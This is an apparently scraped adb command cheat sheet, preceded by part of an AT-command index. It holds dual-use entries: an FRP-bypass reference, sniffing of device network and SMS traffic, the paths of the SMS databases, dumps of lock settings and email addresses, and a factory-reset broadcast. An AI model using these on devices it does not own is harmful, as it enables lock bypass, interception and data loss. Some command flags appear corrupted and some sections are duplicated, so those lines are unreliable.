UICC Logical Channel access AT+CGMI 5 .1 - Request manufacturer identification AT+CGMM 5 .2 - Request model identification AT+CGMR 5 .3 - Request revision identification AT+CGREG 10 .1.20 - GPRS network registration status AT+CGSMS 10 .1.21 - Select service for MO SMS messages AT+CGSN 5 .4 - Request product serial number identification AT+CGTFT 10 .1.3 - Traffic Flow Template AT+CGTFTRDP 10 .1.25 - Traffic Flow Template Read Dynamic Parameters AT+CHLD 7 .13 - Call related supplementary services AT+CHSC 6 .15 - HSCSD current call parameters AT+CHSD 6 .12 - HSCSD device parameters AT+CHSR 6 .16 - HSCSD parameters report AT+CHST 6 .13 - HSCSD transparent call configuration AT+CHSU 6 .17 - HSCSD automatic user initiated upgrading AT+CHUP 6 .5 - Hangup call AT+CIMI 5 .6 - Request international mobile subscriber identity AT+CIND 8 .9 - Indicator control AT+CKPD 8 .7 - Keypad control AT+CLAC 8 .37 - List all available AT commands AT+CLAE 8 .31 - Language Event AT+CLAN 8 .30 - Set Language AT+CLCC 7 .18 - List current calls AT+CLCK 7 .4 - Facility lock AT+CLIP 7 .6 - Calling line identification presentation AT+CLIR 7 .7 - Calling line identification restriction AT+CLVL 8 .23 - Loudspeaker volume level AT+CMAR 8 .36 - Master Reset AT+CMEC 8 .6 - Mobile Termination control mode AT+CMEE 9 .1 - Report mobile termination error AT+CMER 8 .10 - Mobile Termination event reporting AT+CMOD 6 .4 - Call mode AT+CMOLR 8 .50 - Mobile Originated Location Request AT+CMOLRE 9 .1 - Report mobile originated location request error AT+CMOLRE 9 .3 - Mobile termination error result code AT+CMTLR 8 .57 - Mobile Terminated Location Request notification AT+CMUT 8 .24 - Mute control AT+CMUX 5 .7 - Multiplexing mode AT+CNAP 7 .30 - Calling name identification presentation AT+CNUM 7 .1 - Subscriber number AT+COLP 7 .8 - Connected line identification presentation AT+COLR 7 .31 - Connected line identification restriction status AT+COPN 7 .21 - Read operator names AT+COPS 7 .3 - PLMN selection AT+COTDI 11 .1.9 - Originator to Dispatcher Information AT+CPAS 8 .1 - Phone activity status AT+CPBF 8 .13 - Find phonebook entries AT+CPBR 8 .12 - Read phonebook entries AT+CPBS 8 .11 - Select phonebook memory storage AT+CPBW 8 .14 - Write phonebook entry AT+CPIN 8 .3 - Enter PIN AT+CPLS 7 .20 - Selection of preferred PLMN list AT+CPNET 7 .27 - Preferred network indication AT+CPNSTAT 7 .28 - Preferred network status AT+CPOL 7 .19 - Preferred PLMN list AT+CPOS 8 .55 - Positioning Control AT+CPOSR 8 .56 - Positioning Reporting AT+CPPS 7 .23 - eMLPP subscriptions AT+CPROT 8 .42 - Enter protocol mode AT+CPSB 7 .29 - Current Packet Switched Bearer AT+CPUC 8 .27 - Price per unit and currency table AT+CPWC 8 .29 - Power class AT+CPWD 7 .5 - Change password AT+CR 6 .9 - Service reporting control AT+CRC 6 .11 - Cellular result codes AT+CREG 7 .2 - Network registration AT+CRLA 8 .44 - Restricted UICC Logical Channel access AT+CRLP 6 .8 - Radio link protocol AT+CRMC 8 .34 - Ring Melody Control AT+CRMP 8 .35 - Ring Melody Playback AT+CRSL 8 .21 - Ringer sound level AT+CRSM 8 .18 - Restricted SIM access AT+CSCC 8 .19 - Secure control command AT+CSCS 5 .5 - Select TE character set AT+CSDF 6 .22 - Settings date format AT+CSGT 8 .32 - Set Greeting Text AT+CSIL 6 .23 - Silence Command AT+CSIM 8 .17 - Generic SIM access AT+CSNS 6 .19 - Single numbering scheme AT+CSQ 8 .5 - Signal quality AT+CSSAC 7 .32 - Service Specific Access Control restriction status AT+CSSN 7 .17 - Supplementary service notifications AT+CSTA 6 .1 - Select type of address AT+CSTF 6 .24 - Settings time format AT+CSVM 8 .33 - Set Voice Mail Number AT+CTFR 7 .14 - Call deflection AT+CTZR 8 .41 - Time Zone Reporting AT+CTZU 8 .40 - Automatic Time Zone Update AT+CUAD 8 .49 - UICC Application Discovery AT+CUSD 7 .15 - Unstructured supplementary service data AT+CVHU 6 .20 - Voice Hangup Control AT+CVIB 8 .22 - Vibrator mode AT+CVMOD 6 .4 - Voice Call Mode AT+FCLASS C.2.1 - Select mode AT+VBT C.2.2 - Buffer threshold setting AT+VCID C.2.3 - Calling number ID presentation AT+VGR C.2.4 - Receive gain selection AT+VGT C.2.5 - Transmit gain selection AT+VIP C.2.6 - Initialise voice parameters AT+VIT C.2.7 - Inactivity timer AT+VLS C.2.8 - Line selection AT+VRX C.2.9 - Receive data state AT+VSM C.2.10 - Select compression method AT+VTD C.2.12 - Tone duration AT+VTS C.2.11 - DTMF and tone generation AT+VTX C.2.13 - Transmit data state","title":"Commands from the legends on below URL"},{"location":"android/adb/readme/","text":"# Android\u2122 Debug Bridge (adb) Your journey to master Android\u2122 Shell begins here Time flies, it's about time to get up new commands for our Android devices since there is really much stuff that is being added,updated and removed for our devices, I havent seen all those new commands anywere so hopefully this will be useful for you guys aswell. Feel free to contribute to this repo if there is something that i forgot and is worth to know, however, let me show you what's new. I decided to not add 'adb shell ' wich means all commands is executed when we are connected to device but of course if you want to, just add 'adb shell' infront of all commands and it will work aswell without being connected to the device shell All commands that require root will have (Root_Required) in descriptionn. For FRP Bypass and hack any Samsung device with Android 12 installed, see my wiki: Samsung Android 12 FRPBypass - All models Websites linked to this Repository Android\u2122 Debug Bridge - Main Android\u2122 Debug Bridge - Wiki Download Android\u2122 Google Account Manager Google Account Manager Android 4.0.3 Google Account Manager Android 4.4.4 Google Account Manager Android 5.0.1 Google Account Manager Android 6.0 Google Account Manager Android 7.0 Google Account Manager Android 7.1.2 Google Account Manager Android 7.1.25 Google Account Manager Android 8.0 Google Account Manager Android 8.1 Google Account Manager Android 9 Google Account Manager Android 10 Custom Apks \u2122 Blocked On rooted devices samsung health crashing and wont launch anymore and it wont help to change tima from 1 to 0 in build.prop anymore, download the below apk instead to get samsung health working on your rooted device Samsung Health - Android 12 Open Android\u2122 Applications Links works when you clicking the links with your mobile device, please visit android.nr1.nu to get clickable links. Click to Erase Lock Settings (dont press unless you frp unlocking) Click to Open My Files Google Search App Samsung Apps Alliance Shield X (Galaxy Store) Android\u2122 Source Code Android\u2122 Source Code Android\u2122 Issue Tracker Android\u2122 Issue Tracker ADB install Source Files Download SDK Platform-Tools for Linux Download SDK Platform-Tools for MacOSX Download SDK Platform-Tools for Windows MacOSX 1. Download the Android SDK Platform Tools ZIP file for macOS. 2. Extract the ZIP to an easily-accessible location (like the Desktop for example). 3. Open Terminal. 4. To browse to the folder you extracted ADB into, enter the following command: cd /path/to/extracted/folder/ 5. For example, on my Mac it was this: cd /Users/Doug/Desktop/platform-tools/ 6. Connect your device to your Mac with a compatible USB cable. Change the USB connection mode to \u201cfile transfer (MTP)\u201d mode. This is not always required for every device, but it\u2019s best to just leave it in this mode so you don\u2019t run into any issues. 7. Once the Terminal is in the same folder your ADB tools are in, you can execute the following command to launch the ADB daemon: ./adb devices 8. On your device, you\u2019ll see an \u201cAllow USB debugging\u201d prompt. Allow the connection. 9. Finally, re-enter the command from step #7. If everything was successful, you should now see your device\u2019s serial number in macOS\u2019s Terminal window. Linux 1. Download the Android SDK Platform Tools ZIP file for Linux. 2. Extract the ZIP to an easily-accessible location (like the Desktop for example). 3. Open a Terminal window. 4. Enter the following command: cd /path/to/extracted/folder/ 5. This will change the directory to where you extracted the ADB files. 6. So for example: cd /Users/Doug/Desktop/platform-tools/ 7.Connect your device to your Linux machine with your USB cable. Change the connection mode to \u201cfile transfer (MTP)\u201d mode. This is not always necessary for every device, but it\u2019s recommended so you don\u2019t run into any issues. 8. Once the Terminal is in the same folder your ADB tools are in, you can execute the following command to launch the ADB daemon: ./adb devices 9. Back on your smartphone or tablet device, you\u2019ll see a prompt asking you to allow USB debugging. Go ahead and grant it. Windows 10 1: Download: https://dl.google.com/android/repository/platform-tools-latest-windows.zip 2: Extract the contents of this ZIP file into an easily accessible folder (such as C:\\platform-tools) 3: Open Windows explorer and browse to where you extracted the contents of this ZIP file 4: Then open up a Command Prompt from the same directory as this ADB binary. This can be done by holding Shift and Right-clicking within the folder then click the \u201cOpen command window here\u201d option. 5: Connect your smartphone or tablet to your computer with a USB cable. Change the USB mode to \u201cfile transfer (MTP)\u201d mode. Some OEMs may or may not require this, but it\u2019s best to just leave it in this mode for general compatibility. 6: In the Command Prompt window, enter the following command to launch the ADB daemon: adb devices 7: On your phone\u2019s screen, you should see a prompt to allow or deny USB Debugging access. Naturally, you will want to grant USB Debugging access when prompted (and tap the always allow check box if you never want to see that prompt again). 8: Finally, re-enter the command from step #6. If everything was successful, you should now see your device\u2019s serial number in the command prompt (or the PowerShell window). Arch Linux pacman -S android-tools Gentoo emerge --ask dev-util/android-sdk-update-manager Fedora dnf install adb Ubuntu apt install adb fastboot -y Android\u2122 files SMS and Phone Phone logs is stored in below files /data/user_de/0/com.android.providers.telephony/databases/mmssms.db /data/user_de/0/com.android.providers.telephony/databases/telephony.db Audio files is stored in /system/media/audio/ui/ /system/media/audio/ringtones /system/media/audio/notifications ADB commands Start ADB server: adb start-server Stop ADB server: adb stop-server Kill ADB server: adb kill-server Setup ADB server via Wi-Fi adb tcpip <port> Connect to ADB server: adb connect <device_ip> Restarts the adbd daemon listening on USB adb usb List Connected Devices: adb devices Get Status: adb get-state Print Serial Number: adb get-serialno Backup Device: adb backup -all Restore Device: adb restore /path/to/backupflile.adb Enter ADB shell: adb shell Enter ADB shell if there is multiple devices connected: adb -s <id_from_adb_devices> shell To print device serial no: adb get-serialno Create a bugreport: adb bugreport Install an app: adb install <apk_file> Install an app and keep all it's data from a previous setup: adb install -r <apk_file> Uninstall an app: adb uninstall <apk_file> Push a file adb push = tansfer a file: pc > device adb push mypicture.png /storage/on/device Push a folder (Transfer a folder FROM pc > device) adb push myfolder /storage/on/device Pull a file adb pull = tansfer a file: device > pc adb pull /storage/on/device/mypicture.png /path/on/pc Pull a folder (Transfer a folder FROM device > pc) adb pull /storage/on/device /path/on/pc Pull installed apk files Script for pull all installed Apks Script for pull all installed system Apks Script for pull all Apks installed by you Pull all files inside a folder to a path (Transfer all files in a folder FROM device > pc) adb pull /storage/on/device/ /path/on/pc # Notice the trial slash ADB exec-out Stream Device Screen on your PC TIPS WANTED! Does anyone know how to to view AND record the stream at same time? Let me know! Exec Out Syntax adb exec-out screenrecord --Example Output-format=h264 - | prefered tool - <stdin> Stream via Mplayer (Recommended) Recommended since it is starts immediately, very little delay, and doesn't freak out like vlc. adb exec-out screenrecord --output-format=h264 - | ffplay -framerate 60 -probesize 32 -sync video - ffplay works, but it seems to take a few seconds to decide to start, and ends up lagging well behind the entire time. Stream via FFPLay FFPlay Default - No Settings adb shell screenrecord --Example Output-format=h264 - | ffplay - FFplay Customized adb exec-out screenrecord --Example Output-format = h264 - | ffplay -framerate 60 -probesize 32 -sync video - adb shell screenrecord --bit-rate = 16m --Example Output-format = h264 --size 800x600 - | ffplay -framerate 60 -framedrop -bufsize 16M - FFplay Customized - Stream vin 1080p adb exec-out screenrecord --bit-rate = 16m --Example Output-format = h264 --size 1920x1080 - Stream via VLC Adding \u2013clock-jitter=0 seems to make the errors less traumatic, but it's still pretty messed up vlc is not recommended for this, use FFplay or Mplayer if possible Stream via VLC on Windows adb exec-out screenrecord --bit-rate = 4m --Example Output-format = h264 --size 800x600 --show-frame-time - \\ | \"c:\\Program Files\\VideoLAN\\VLC\\vlc\" --demux h264 - vlc://quit Record your device screen via VLC on Windows adb exec-out screenrecord --bit-rate = 4m --Example Output-format = h264 --size 800x600 --show-frame-time - \\ | \"c:\\Program Files\\VideoLAN\\VLC\\vlc\" --demux h264 --sout file/ts:c: \\t emp \\s creenrec.mpg - vlc://quit Network Analyze Sniff your device network and SMS traffic via Wireshark on your PC adb exec-out \"tcpdump -i any -U -w - 2>/dev/null\" | wireshark -k -S -i - ADB reboot System adb reboot Recovery adb reboot recovery Bootloader adb reboot bootloader Fastboot (some brands) adb reboot fastboot ADB date Set date date MMDDYYYY.XX;am broadcast -a android.intent.action.TIME_SET ADB cmd cmd testharness About: Test Harness Mode is a mode that the device can be placed in to prepare the device for running UI tests. The device is placed into this mode by first wiping all data from the device, preserving ADB keys. By default, the following settings are configured: * Package Verifier is disabled * Stay Awake While Charging is enabled * OTA Updates are disabled * Auto-Sync for accounts is disabled Other apps may configure themselves differently in Test Harness Mode by checking ActivityManager.isRunningInUserTestHarness() Test Harness Mode commands: help Print this help text. enable|restore Erase all data from this device and enable Test Harness Mode, preserving the stored ADB keys currently on the device and toggling settings in a way that are conducive to Instrumentation testing. cmd stats meminfo *Prints the malloc debug information. You need to run the following first: adb shell stop adb shell setprop libc.debug.malloc.program statsd adb shell setprop libc.debug.malloc.options backtrace adb shell start cmd stats print-stats Send a broadcast that triggers the subscriber to fetch metrics. cmd stats send-broadcast [UID] NAME UID The uid of the configuration. It is only possible to pass the UID parameter on eng builds. If UID is omitted the calling uid is used. NAME The name of the configuration Flushes all data on memory to disk. cmd stats write-to-disk Prints the UID, app name, version mapping. cmd stats print-uid-map Log a binary push state changed event. cmd stats log-binary-push NAME VERSION STAGING ROLLBACK_ENABLED LOW_LATENCY STATE EXPERIMENT_IDS NAME The train name. VERSION The train version code. STAGING If this train requires a restart. ROLLBACK_ENABLED If rollback should be enabled for this install. LOW_LATENCY If the train requires low latency monitoring. STATE The status of the train push. Integer value of the enum in atoms.proto. EXPERIMENT_IDS Comma separated list of experiment ids. Leave blank for none. Hide all notifications icons on Status Bar cmd statusbar send-disable-flag notification-icons Reset all flags to default cmd statusbar send-disable-flag none Print Status Bar Icons cmd statusbar get-status-icons Print Preferences for Status Bar cmd statusbar prefs list-prefs Expand Status Bar cmd statusbar expand-notifications Collapse Status Bar cmd statusbar collapse Expand Full Settings cmd statusbar expand-settings Status Bar Help cmd statusbar help Print auth user cmd user list Enable night mode (Dark Mode) cmd uimode night yes Disable night mode cmd uimode night no Enable car Mode cmd uimode car yes Disable car (car Mode) cmd uimode car no Scan for nearby ssid:s, give it 7 seconds for scan and fetch some wifi data cmd -w wifi start-scan sleep 7 cmd -w wifi list-scan-results Sets whether we are in the middle of an emergency call. Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALL_STATE_CHANGED broadcast. cmd -w wifi set-emergency-call-state enabled|disabled Sets whether Emergency Callback Mode (ECBM) is enabled. cmd -w wifi set-emergency-callback-mode enabled|disabled Lists the suggested networks from the app cmd -w wifi list-suggestions-from-app <package name> Lists all suggested networks on this device cmd -w wifi list-all-suggestions Note: This only returns whether the app was set via the 'network-requests-set-user-approved' shell command Queries whether network requests from the app is approved or not. cmd -w wifi network-requests-has-user-approved <package name> Note: Only 1 such app can be approved from the shell at a time Sets whether network requests from the app is approved or not. cmd -w wifi network-requests-set-user-approved <package name> yes|no Lists the requested networks added via shell cmd -w wifi list-requests Removes all active requests added via shell cmd -w wifi remove-all-requests Remove a network request with provided SSID of the network cmd -w wifi remove-request <ssid> Add a network request with provided params cmd -w wifi add-request <ssid> open|owe|wpa2|wpa3 [<passphrase>] [-b <bssid>] Initiates wifi settings reset cmd -w wifi settings-reset Gets softap supported features. Will print 'wifi_softap_acs_supported' cmd -w wifi get-softap-supported-features Gets setting of wifi watchdog trigger recovery. cmd -w wifi get-wifi-watchdog Sets whether wifi watchdog should trigger recovery cmd -w wifi set-wifi-watchdog enabled|disabled Sets country code to or left for normal value cmd -w wifi force-country-code enabled <two-letter code> | disabled Manually triggers a link probe. cmd -w wifi send-link-probe Clears the user disabled networks list. cmd -w wifi clear-user-disabled-networks Removes all user approved network requests for the app. cmd -w wifi network-requests-remove-user-approved-access-points <package name> Clear the user choice on Imsi protection exemption for carrier cmd -w wifi imsi-protection-exemption-clear-user-approved-for-carrier <carrier id> Queries whether Imsi protection exemption for carrier is approved or not cmd -w wifi imsi-protection-exemption-has-user-approved-for-carrier <carrier id> Sets whether Imsi protection exemption for carrier is approved or not cmd -w wifi imsi-protection-exemption-set-user-approved-for-carrier <carrier id> yes|no Queries whether network suggestions from the app is approved or not. cmd -w wifi network-suggestions-has-user-approved <package name> Sets whether network suggestions from the app is approved or not. cmd -w wifi network-suggestions-set-user-approved <package name> yes|no Sets whether low latency mode is forced or left for normal operation. cmd -w wifi force-low-latency-mode enabled|disabled Sets whether hi-perf mode is forced or left for normal operation. cmd -w wifi force-hi-perf-mode enabled|disabled Gets current interval between RSSI polls, in milliseconds. cmd -w wifi get-poll-rssi-interval-msecs Sets the interval between RSSI polls to milliseconds. cmd -w wifi set-poll-rssi-interval-msecs <int> Gets setting of CMD_IP_REACHABILITY_LOST events triggering disconnects. Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALL_STATE_CHANGED broadcast, sets whether we are in the middle of an emergency call. cmd -w wifi set-emergency-call-state enabled|disabled Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALLBACK_MODE_CHANGED broadcast. cmd -w wifi set-emergency-callback-mode enabled|disabled Lists the suggested networks from the app cmd -w wifi list-suggestions-from-app <package name> Lists all suggested networks on this device cmd -w wifi list-all-suggestions Notice: This only returns whether the app was set via the 'network-requests-set-user-approved' shell command Queries whether network requests from the app is approved or not cmd -w wifi network-requests-has-user-approved <package name> Note: Only 1 such app can be approved from the shell at a time Sets whether network requests from the app is approved or not. cmd -w wifi network-requests-set-user-approved <package name> yes|no Lists the requested networks added via shell cmd -w wifi list-requests Removes all active requests added via shell cmd -w wifi remove-all-requests Remove a network request with provided SSID of the network cmd -w wifi remove-request <ssid> Add a network request with provided params cmd -w wifi add-request <ssid> open|owe|wpa2|wpa3 [<passphrase>] [-b <bssid>] Initiates wifi settings reset cmd -w wifi settings-reset and/or 'wifi_softap_wpa3_sae_supported', each on a separate line. cmd -w wifi get-softap-supported-features Gets setting of wifi watchdog trigger recovery. cmd -w wifi get-wifi-watchdog Sets whether wifi watchdog should trigger recovery cmd -w wifi set-wifi-watchdog enabled|disabled Sets country code to or left for normal value cmd -w wifi force-country-code enabled <two-letter code> | disabled Sets whether soft AP channel is forced to MHz cmd -w wifi force-softap-channel enabled <int> | disabled Manually triggers a link probe. cmd -w wifi send-link-probe Clears the user disabled networks list. cmd -w wifi clear-user-disabled-networks Removes all user approved network requests for the app. cmd -w wifi network-requests-remove-user-approved-access-points <package name> Clear the user choice on Imsi protection exemption for carrier cmd -w wifi imsi-protection-exemption-clear-user-approved-for-carrier <carrier id> Queries whether Imsi protection exemption for carrier is approved or not cmd -w wifi imsi-protection-exemption-has-user-approved-for-carrier <carrier id> Sets whether Imsi protection exemption for carrier is approved or not cmd -w wifi imsi-protection-exemption-set-user-approved-for-carrier <carrier id> yes|no List uid owner of a app cmd package list packages -U#### List packages a.k.a: pm list packages cmd package list packages -l List disabled packages cmd package list packages -d Filter to only show enabled packages cmd package list packages -e Filter to only show third party packages cmd package list packages -3 Set the default home activity (aka launcher) cmd package set-home-activity [--user USER_ID] TARGET-COMPONENT Prints all features of the system cmd package list features Print briefs cmd package resolve-activity --brief com.facebook.katana priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=false com.facebook.katana/.LoginActivity ADB pm Print all applications in use pm list packages | sed -e \"s/package://\" | while read x ; do cmd package resolve-activity --brief $x \\ | tail -n 1 \\ | grep -v \"No activity found\" done List all packages installed on device pm list packages List enabled packages pm list packages -e List disabled packages pm list packages -d List third party packages installed by user pm list packages -3 List users pm list users List permission groups pm list permission-groups List features pm list features Uninstall any installed package: pm uninstall --user 0 com.package.name Uninstall multiple apps: for packages in com.package1 com.package2 ; do adb shell pm uninstall --user 0 \" ${ packages } \" done Clear application data: pm clear PACKAGE_NAME List permission groups: pm list permission-groups List instrumentation: pm list instrumentation Grant permission to an app (Example Only For Grant): pm grant com.application android.permission.READ_LOGS Revoke permission to an app (Example Only For Revoke): pm revoke com.application android.permission.READ_LOGS Reset all permissions for an app: pm reset-permissions -p your.app.package ADB logcat Default options: Example Output * V \u2014 Verbose (lowest priority) * D \u2014 Debug * I \u2014 Info (default priority) * W \u2014 Warning * E \u2014 Error * F \u2014 Fatal * S \u2014 Silent (highest priority, on which nothing is ever printed) Use -v time for print timestamps, and threadtime for dates: adb logcat -v time ... adb logcat -v threadtime .... For get Example Output colorized with logcat: adb logcat ... -v color Displays current log buffer sizes: adb logcat -g Sets the buffer size (K or M): adb logcat -G 16M Clear the log buffer: adb logcat -c Enables ALL log messages (verbose mode) adb logcat *:V Dump everything to a file: adb logcat -f <filename> Dumps to specified file Display PID with the log info adb logcat -v process Display the raw log message, with no other metadata fields adb logcat -v raw Display the date, invocation time, priority/tag, and PID of the process issuing the message adb logcat -v time Display the priority, tag, and the PID and TID of the thread issuing the message adb logcat -v thread Display the date, invocation time, priority, tag, and the PID and TID of the thread issuing the message adb logcat -v threadtime Display all metadata fields and separate messages with blank lines adb logcat -v long Log multiple options (-b \u2026 -b ....): adb logcat -b main -b radio -b events Run all at once, no reason for use it like this really adb logcat -v brief -v long -v process -v raw -v tag -v thread -v threadtime -v time -v color ADB dumpsys List all active services: dumpsys -l List services on older devices via command below dumpsys -l | sed 's/^ / /g' Example Output Currently running services: AAS AODManagerService CCM CocktailBarService CodecSolution CustomFrequencyManagerService DeviceRootKeyService DirEncryptService DisplaySolution DockObserver EngineeringModeService HqmManagerService ImsBase OcfKeyService ReactiveService SEAMService SamsungKeyProvisioningManagerService SatsService SecExternalDisplayService Dumpsys lock_settings dumpsys lock_settings Example Output Current lock settings service state: User State: User 0 SP Handle: 5f0ef3437a85f55 Last changed: 2021-07-28 20:22:36 (b8212446331f2358) SID: 3fffcda35ee6c180 Quality: 0 CredentialType: Pin SeparateChallenge: true Metrics: known Storage: User 0 [/data/system_de/0/spblob]: 5 2021-07-28 20:22:36 05f0ef3437a85f55.weaver 31 2021-07-28 20:22:36 05f0ef3437a85f55.pwd 72 2021-07-28 20:22:36 05f0ef3437a85f55.metrics 186 2021-07-28 20:22:36 05f0ef3437a85f55.spblob 58 2021-07-28 20:22:36 0000000000000000.handle StrongAuth: PrimaryAuthFlags state: userId = 0, primaryAuthFlags=0 NonStrongBiometricAllowed state: RebootEscrow: mRebootEscrowWanted = false mRebootEscrowReady = false mRebootEscrowListener = com.android.server.recoverysystem.RecoverySystemService@bc1c4d8 mPendingRebootEscrowKey is not set Print codecs for bluetooth headphones dumpsys media.audio_flinger | grep -A3 Input Show bluetooth macaddr, bluetooth name and such things dumpsys bluetooth_manager Dump phone registry dumpsys telephony.registry Dump GPS Data: dumpsys location Dump Settings adb shell dumpsys settings Example Output _id:225 name:lock_screen_show_notifications pkg:com.android.settings value:1 _id:6 name:volume_bluetooth_sco pkg:android value:7 default:7 _id:192 name:ringtone_set pkg:com.google.android.gsf value:1 _id:159 name:lock_screen_allow_rotation pkg:android value:0 _id:2997 name:Flashlight_brightness_level pkg:com.android.systemui value:1001 _id:67 name:SEM_VIBRATION_NOTIFICATION_INTENSITY pkg:android value:5 _id:175 name:call_popup pkg:android value:0 default:0 _id:59 name:install_non_market_apps pkg:android value:1 default:1 Display Contacts On Sim Card adb shell dumpsys simphonebook Show hardware info as thermal stuff for cpu, gpu and battery adb shell dumpsys hardware_properties Example Output ****** Dump of HardwarePropertiesManagerService ****** CPU temperatures: [38.0, 38.0] CPU throttling temperatures: [55.0, 76.0] CPU shutdown temperatures: [115.0, 115.0] Show all application you have an account on: dumpsys account | grep -i com.*$ -o | cut -d ' ' -f1 | cut -d } -f1 | grep -v com$ Example Output com.microsoft.workaccount com.skype.raider com.samsung.android.mobileservice com.facebook.messenger com.google.android.gm.exchange Show all notifications listener and so on: dumpsys notification List email addresses registerd on different stuff on device: dumpsys | grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b\" Print version of a specifik package dumpsys package com.lge.signboard | grep versionName versionName=6.00.170603-0 Check state for screen and figoure how device was unlcked last time: adb shell dumpsys user Example Output State: RUNNING_UNLOCKED Last logged in fingerprint agree Knox Privacy Policy: false And for example, you can dump data for all of the running services, dump all data for battery: adb shell dumpsys battery Dump stats for your battery: adb shell dumpsys batterystats Erase old stats for battery: dumpsys batterystats --reset Sort Applications By Ram Usage: dumpsys meminfo Example Output Applications Memory Usage (in Kilobytes): Uptime: 29602806 Realtime: 57806941 Total PSS by process: 265,435K: com.android.systemui (pid 4190) 264,671K: system (pid 3838) 171,192K: surfaceflinger (pid 3360) 152,523K: android.hardware.graphics.composer@2.1-service (pid 3338) 128,781K: com.sec.android.app.launcher (pid 5597 / activities) 92,656K: se.kronansapotek.kronan (pid 26729 / activities) 84,563K: logd (pid 3203) 80,944K: com.google.android.talk (pid 32314 / activities) 79,754K: com.google.android.googlequicksearchbox:search Unplug AC: dumpsys battery unplug See current used app: dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'|grep '/'|awk -F'u0' '{print $2}'|awk '{print $1}' Print how many notifications you have: dumpsys notification | grep NotificationRecord | wc -l ADB dumpstate Dump info about your sim provider and kernel bootloader ID etc. dumpstate -v Example Output = ======================================================= = = dumpstate: 2019-08-30 19:31:05 = ======================================================= Build: PPR1.180610.011.G950FXXS5DSF1 Build fingerprint: 'samsung/dreamltexx/dreamlte:9/PPR1.180610.011/G950FXXS5DSF1:user/release-keys' Bootloader: G950FXXS5DSF1 Radio: G950FXXS5DSF1 Network: Comviq Linux version 4.4.111-16019454 (dpi@21DHA724) (gcc version 4.9.x 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Jun 3 20:16:50 KST 2019 Kernel: Command line: (unknown) up 0 weeks, 0 days, 16 hours, 21 minutes Uptime: Bugreport format version: 2.0 Dumpstate info: id = 0 pid=26940 dry_run=0 args=dumpstate -v extra_options= ADB am How to use Demo Mode First you enable the Demo Mode: settings put global sysui_demo_allowed 1 Display time 12:00 am broadcast -a com.android.systemui.demo -e command clock -e hhmm 1200 Display full mobile data without type am broadcast -a com.android.systemui.demo -e command network -e mobile show -e level 4 -e datatype false Hide notifications am broadcast -a com.android.systemui.demo -e command notifications -e visible false Show full battery but not in charging state am broadcast -a com.android.systemui.demo -e command battery -e plugged false -e level 100 Exit Demo Mode am broadcast -a com.android.systemui.demo -e command exit Add a value to default shared preferences. adb shell 'am broadcast -a org.example.app.sp.PUT --es key key_name --es value \"hello world!\"' Remove a value to default shared preferences. adb shell 'am broadcast -a org.example.app.sp.REMOVE --es key key_name' Clear all default shared preferences. adb shell 'am broadcast -a org.example.app.sp.CLEAR --es key key_name' It's also possible to specify shared preferences file. adb shell 'am broadcast -a org.example.app.sp.PUT --es name Game --es key level --ei value 10' Play a mp3 track on device am start -a android.intent.action.VIEW -d file:////storage/9A8A-1069/wuseman/ringtones/<mp3_track>.mp3 -t audio/mp3 Data types adb shell 'am broadcast -a org.example.app.sp.PUT --es key string --es value \"hello world!\"' adb shell 'am broadcast -a org.example.app.sp.PUT --es key boolean --ez value true' adb shell 'am broadcast -a org.example.app.sp.PUT --es key float --ef value 3.14159' adb shell 'am broadcast -a org.example.app.sp.PUT --es key int --ei value 2015' adb shell 'am broadcast -a org.example.app.sp.PUT --es key long --el value 9223372036854775807' Restart application process after making changes adb shell 'am broadcast -a org.example.app.sp.CLEAR --ez restart true' Open Google Camera (Pixel 4) am start com.google.android.GoogleCamera Set default preferences for an app: am broadcast -a org.example.app.sp.CLEAR --es key key_name WARNING!! Factory Reset am broadcast -a android.intent.action.MASTER_CLEAR Open Special Menu am start -a android.intent.action.VIEW \\ Open settings: am start -n com.android.settings/com.android.settings.Settings Open activity to new APN am start -a android.intent.action.INSERT content://telephony/carriers --ei simId Open hiden menu (require root) su -c \"am broadcast -a android.provider.Telephony.SECRET_CODE -d android_secret_code://IOTHIDDENMENU\" Start prefered webbrowser: am start -a android.intent.action.VIEW -d <url> (com.android.browser | com.android.chrome | com.sec.android.sbrowser) Print Activities: am start -a com.android.settings/.wifi.CaptivePortalWebViewActivity Open Camera in Photo mode am start -a android.media.action.IMAGE_CAPTURE Open Camera in Photo mode and take a picture am start -a android.media.action.IMAGE_CAPTURE input keyevent 66 Open Camera in Video mode am start -a android.media.action.VIDEO_CAMERA Open Camera in Video mode and start recording am start -a android.media.action.VIDEO_CAMERA input keyevent 66 Go to gallary and choose a picture and then set wallpaper: am start -a android.intent.action.SET_WALLPAPER Open any URL in default browser am start -a android.intent.action.VIEW -d https://github.com/wuseman Open Google Maps with fixed coordinates am start -a android.intent.action.VIEW -d \"geo:46.457398,-119.407305\" Simulate waking your app using the following commands am set-inactive <packageName> am set-inactive <packageName> false Enabling Night Mode (If Supported) am start --ez show_night_mode true com.android.systemui/.tuner.TunerActivity Start facebook application inbox by using URI am start -a android.intent.action.VIEW -d facebook://facebook.com/inbox Open a vcard file from sdcard (will open contacts app) am start -a android.intent.action.VIEW -d file:///sdcard/me.vcard -t text/x-vcard Open an application to get content (in this case to get a jpeg picture) am start -a android.intent.action.GET_CONTENT -t image/jpeg There is several ways to send a SMS via AM, here is just one of several ways: am broadcast -a com.whereismywifeserver.intent.TEST --es sms_body \"test from adb\" #### Simulate waking your app using the following commands: am set-inactive <packageName> am set-inactive <packageName> false Start facebook application inbox by using URI am start -a android.intent.action.VIEW -d facebook://facebook.com/inbox Open a vcard file from sdcard (will open contacts app) am start -a android.intent.action.VIEW -d file:///sdcard/me.vcard -t text/x-vcard Open an application to get content (in this case to get a jpeg picture) am start -a android.intent.action.GET_CONTENT -t image/jpeg There is several ways to send a SMS via AM, here is one example: am broadcast -a com.whereismywifeserver.intent.TEST --es sms_body \"test from adb\" Open settings for a specifik app am start -a android.settings.APPLICATION_DETAILS_SETTINGS package:<com.package.example> Add Contacts Add a Contact - Example 1 am start -a android.intent.action.INSERT -t vnd.android.cursor.dir/contact -e name \"$(dialog --stdout --inputbox 'wuseman' 0 0)\" -e postal \"$(dialog --stdout --inputbox 'Postal Address' 0 0)\" 